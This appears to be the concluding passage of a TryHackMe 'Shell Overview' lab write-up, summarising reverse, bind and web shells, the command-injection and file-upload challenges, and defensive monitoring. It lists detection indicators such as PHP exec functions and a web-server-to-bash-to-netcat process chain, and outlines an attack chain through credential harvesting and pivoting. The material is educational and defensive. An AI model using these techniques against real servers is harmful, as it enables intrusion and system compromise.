```php
system()
exec()
shell_exec()
passthru()
popen()
```

These are common indicators of malicious Web Shell activity.

---

# Key Takeaways

- A Web Shell is a server-side script that executes operating system commands through HTTP requests.
- Unlike Reverse Shells, Web Shells do not require a listener or a persistent TCP connection.
- Every command is executed through a new HTTP request.
- Unrestricted File Upload vulnerabilities frequently lead to Remote Code Execution.
- URL encoding (for example, `%20` for spaces) is often required when sending commands through HTTP parameters.
- Attackers commonly use Web Shells as an initial foothold before upgrading to a Reverse Shell for a better interactive experience.

---

# Next Section

In the final section, we will summarize the room, compare all shell types, discuss detection strategies, review the knowledge gained throughout the room, and identify the next topics to study on the cybersecurity learning path.
```

# Conclusion

The **Shell Overview** room provides a solid introduction to one of the most fundamental concepts in offensive security: **remote shell access**.

Although the room appears simple at first glance, it introduces concepts that are used repeatedly throughout penetration testing, red teaming, and incident response.

Rather than simply memorizing reverse shell payloads, the room focuses on understanding **how shells work**, **why they work**, and **when each shell type should be used**.

Throughout this room, we explored three primary shell types:

- Reverse Shell
- Bind Shell
- Web Shell

We also learned how shell listeners receive incoming connections, how payloads expose shells over the network, and how web applications can be abused to achieve Remote Command Execution (RCE).

Finally, we applied these concepts in two practical exploitation challenges involving **Command Injection** and **Unrestricted File Upload**, demonstrating how real-world vulnerabilities can lead to complete system compromise.

---

# Shell Comparison

| Feature | Reverse Shell | Bind Shell | Web Shell |
|----------|---------------|------------|-----------|
| Communication | TCP | TCP | HTTP/HTTPS |
| Connection Initiator | Victim | Attacker | Browser |
| Listener Required | Yes | No | No |
| Interactive Session | Yes | Yes | Limited |
| Firewall Friendly | Excellent | Poor | Excellent |
| Common in Real Attacks | Very Common | Less Common | Very Common |
| Typical Initial Access | RCE | RCE | File Upload / RCE |

Each shell serves a different purpose, and understanding their differences helps penetration testers choose the appropriate technique depending on the target environment.

---

# Major Concepts Learned

Throughout this room, we covered:

## Shell Fundamentals

- What a shell is
- Local vs Remote Shells
- Shells in offensive security
- Shells in post-exploitation

---

## Reverse Shells

- Connect-back model
- Netcat listeners
- TCP communication
- Interactive remote access
- Why reverse shells bypass firewalls

---

## Bind Shells

- Listening ports
- Inbound connections
- Advantages and disadvantages
- Firewall limitations

---

## Shell Listeners

Tools explored:

- Netcat
- Rlwrap
- Ncat
- Socat

Each listener provides different features depending on the engagement.

---

## Shell Payloads

Payloads written in:

- Bash
- PHP
- Python
- BusyBox
- Telnet
- AWK

One important lesson is that penetration testers should **understand payload logic rather than memorize payload syntax**.

Most payloads simply:

```text
Create Socket
      │
      ▼
Connect
      │
      ▼
Launch Shell
      │
      ▼
Redirect Input & Output
```

The implementation changes, but the underlying concept remains the same.

---

## Web Shells

We learned how web shells:

- Execute commands through HTTP requests.
- Use server-side scripting languages.
- Interact with the operating system.
- Serve as an initial foothold before launching a Reverse Shell.

---

# Practical Challenges Completed

## Challenge 1

**Vulnerability**

Command Injection

**Objective**

Gain a Reverse Shell.

**Skills Practiced**

- Netcat Listener
- Reverse Shell
- System Enumeration
- Finding Files
- Reading Sensitive Files

---

## Challenge 2

**Vulnerability**

Unrestricted File Upload

**Objective**

Upload a PHP Web Shell.

**Skills Practiced**

- Creating a PHP Web Shell
- Executing commands through HTTP
- URL Encoding
- File Enumeration
- Reading Sensitive Files

---

# Red Team Perspective

Shells are the bridge between exploitation and post-exploitation.

Typical attack chain:

```text
Recon
      │
      ▼
Enumeration
      │
      ▼
Exploit
      │
      ▼
Remote Code Execution
      │
      ▼
Reverse/Web Shell
      │
      ▼
Privilege Escalation
      │
      ▼
Credential Harvesting
      │
      ▼
Persistence
      │
      ▼
Pivoting
```

Without obtaining a shell, many post-exploitation techniques become significantly more difficult.

---

# Blue Team Perspective

From a defensive standpoint, shell activity should be considered highly suspicious.

Security teams should monitor for:

- Web servers spawning shell processes.
- Outbound TCP connections from web services.
- Unexpected listening ports.
- Uploaded executable scripts.
- PHP functions such as:

```php
system()
exec()
shell_exec()
passthru()
popen()
```

- Parent-child process relationships like:

```text
apache2
     │
     ▼
php
     │
     ▼
bash
     │
     ▼
nc
```

Modern Endpoint Detection and Response (EDR) platforms frequently detect attacks using these behavioral indicators rather than relying solely on signatures.

---

# Common Misconceptions

### "Reverse Shells are the only type of shell."

False.

Reverse Shells, Bind Shells, and Web Shells all provide remote command execution, but they communicate differently.

---

### "Web Shells are the same as Reverse Shells."

False.

A Web Shell communicates through HTTP.

A Reverse Shell communicates through a persistent TCP connection.

---

### "Attackers memorize hundreds of payloads."

False.

Experienced penetration testers usually understand the underlying concepts and use payload references such as reverse shell cheat sheets when necessary.

Understanding the mechanics behind shell payloads is much more valuable than memorization.

---

# Security Lessons

Developers should:

- Validate all user input.
- Avoid executing operating system commands whenever possible.
- Store uploaded files outside the web root.
- Disable execution inside upload directories.
- Apply least privilege.
- Monitor abnormal process creation.

Even a small mistake, such as executing unsanitized input or allowing unrestricted PHP uploads, can result in complete server compromise.

---

# Skills Gained

After completing this room, you should now understand:

- Remote Shell Fundamentals
- Reverse Shells
- Bind Shells
- Web Shells
- TCP Communication
- Shell Listeners
- Netcat
- HTTP Command Execution
- Command Injection
- Unrestricted File Upload
- Basic Linux Enumeration
- Remote Code Execution (RCE)
- URL Encoding
- Basic Post-Exploitation Workflow

These concepts are fundamental building blocks for advanced penetration testing.

---

# Knowledge Strengthened

This room reinforces knowledge from several previous TryHackMe rooms, including:

- Linux Fundamentals
- Networking Basics
- Networking Core Protocols
- Web Application Basics
- Burp Suite Basics
- JavaScript Essentials

Understanding how these topics connect together provides a much stronger foundation for future web exploitation and privilege escalation challenges.

---

# Recommended Next Topics

After completing this room, consider studying:

- Linux Privilege Escalation
- Command Injection
- File Upload Vulnerabilities
- Local File Inclusion (LFI)
- Remote File Inclusion (RFI)
- OWASP Top 10
- Metasploit Framework
- Web Exploitation
- Active Directory
- Pivoting & Tunneling

These topics naturally build upon the shell concepts introduced in this room.

---

# Key Takeaways

- A shell provides an interface for interacting with an operating system.
- Reverse Shells are the most common shell type used during penetration testing.
- Bind Shells expose a listening service on the victim and are less common due to firewall restrictions.
- Web Shells execute operating system commands through HTTP requests and are frequently deployed after file upload vulnerabilities.
- Understanding how shell payloads work is more important than memorizing individual payloads.
- Command Injection and Unrestricted File Upload vulnerabilities often lead directly to Remote Code Execution (RCE).
- Obtaining a shell is rarely the end goal—it is the gateway to post-exploitation activities such as privilege escalation, persistence, and pivoting.

---

# References

- TryHackMe — Shell Overview
- Netcat Documentation
- Ncat Documentation (Nmap Project)
- Socat Documentation
- GNU Bash Documentation
- PHP Documentation
- Python Documentation
- OWASP Web Security Testing Guide
- PayloadsAllTheThings
- GTFOBins

---

# Tags

```text
TryHackMe
Shell Overview
Linux
Bash
Reverse Shell
Bind Shell
Web Shell
Netcat
Ncat
Socat
PHP
Python
Networking
TCP
HTTP
Command Injection
Unrestricted File Upload
Remote Code Execution
Web Security
Post Exploitation
Cybersecurity
Penetration Testing
Red Team
Blue Team
```

---

# Final Thoughts

This room marks an important transition from learning individual tools and protocols to understanding how vulnerabilities are chained together during real-world attacks.

A successful exploitation rarely ends with a single command. Instead, attackers use vulnerabilities to gain **Remote Code Execution**, establish a shell, enumerate the system, escalate privileges, and ultimately achieve their objectives.

By understanding **Reverse Shells**, **Bind Shells**, and **Web Shells**, you now possess one of the core building blocks required for web exploitation, privilege escalation, Active Directory attacks, and professional penetration testing. Nearly every offensive security pathway will revisit these concepts, making this room a foundational milestone in your cybersecurity journey.